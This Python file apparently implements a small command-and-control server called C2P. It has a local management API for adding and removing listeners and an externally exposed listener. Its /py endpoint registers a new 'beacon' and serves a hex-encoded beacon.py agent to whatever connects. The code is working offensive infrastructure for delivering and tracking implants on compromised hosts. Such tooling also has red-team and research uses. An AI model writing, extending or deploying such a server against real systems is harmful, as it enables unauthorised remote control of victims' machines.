#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
from aiohttp import ClientSession, web, CookieJar, client_exceptions
import uuid
import json
import time
from pathlib import Path

from src.core.logger_config import configure_logger, logger

class Beacon(object):
    def __init__(self, language="python"):
        self.language = language
        self.uuid = uuid.uuid4()
        self.last_seen = time.time()

class C2P(object):
    running = True
    apirunner = None
    extrunner = None
    listeners = {}
    beacons = {}
    client_max_size = 1024**2*99999
    default_ext_host = "0.0.0.0"
    default_ext_port = 5818
    
    async def start(self):
        await self.ApiServer()
        await self.ExtServer()

    async def cleanup(self):
        await self.apirunner.cleanup()
        await self.extrunner.cleanup()

    async def ExtServer(self):
        app = web.Application(client_max_size=self.client_max_size)
        app.add_routes([
        web.get('/py', self.InitPyBeacon),
        ])

        runner = web.AppRunner(app)
        await runner.setup()

        self.extrunner = runner

    async def ApiServer(self):
        app = web.Application(client_max_size=self.client_max_size)
        app.add_routes([
        web.get('/listeners', self.GetListeners),
        web.post('/stop', self.Stop),
        web.post('/listener/del', self.DeleteListener),
        web.post('/listener/add', self.AddListener),
        ])

        runner = web.AppRunner(app)
        await runner.setup()

        ssl_context = None
        host = "127.0.0.15"
        port = 7641
        site = web.TCPSite(runner, host, port, ssl_context=ssl_context)
        await site.start()

        self.listeners[f"{host}:{port}"] = site
        self.apirunner = runner

    async def Stop(self, req):
        self.running = False
        msg = "Stop request sent"
        logger.info(msg)
        return web.json_response({"msg": msg})

    async def DeleteListener(self, req):
        data = await req.post()
        host = data.get('host', self.default_ext_host)
        port = data.get('port', self.default_ext_port)
        key = f"{host}:{port}"
        if key not in self.listeners.keys():
            msg = "No active listener found"
            return web.json_response({"msg": msg})
        
        await self.listeners[key].stop()
        del self.listeners[key]

        msg = f"Removed listener {host}:{port}"
        logger.info(msg)
        return web.json_response({"msg": msg})

    async def AddListener(self, req):
        data = await req.post()
        host = data.get('host', self.default_ext_host)
        port = data.get('port', self.default_ext_port)
        key = f"{host}:{port}"
        if key in self.listeners.keys():
            msg = "Already listening"
            return web.json_response({"msg": msg})

        ssl_context = None
        site = web.TCPSite(self.extrunner, host, port, ssl_context=ssl_context)
        await site.start()
        self.listeners[key] = site

        msg = f"New listener {host}:{port}"
        logger.info(msg)
        return web.json_response({"msg": msg})
    
    async def GetListeners(self, req):
        listeners = [x for x in self.listeners.keys()]
        return web.json_response(listeners)

    async def InitPyBeacon(self, req):
        beacon = Beacon()
        self.beacons[beacon.uuid] = beacon
        msg = f"New beacon : {beacon.uuid}"
        logger.info(msg)

        agent_file_path = Path(__file__).parent.parent / "beacons" / "beacon.py"
        with open(agent_file_path, 'rb') as f:
            content = f.read().hex()[::1]
            
        return web.Response(text=content)

async def Main():
    configure_logger()
    c2p = C2P()
    await c2p.start()
    while c2p.running:
        try: await asyncio.sleep(0.5)
        except: 
            print("")
            logger.info("Exception received")
            break
    
    logger.info("Ending C2P")
    await c2p.cleanup() 
    logger.info("Gracefull exit")

def main():
    asyncio.run(Main())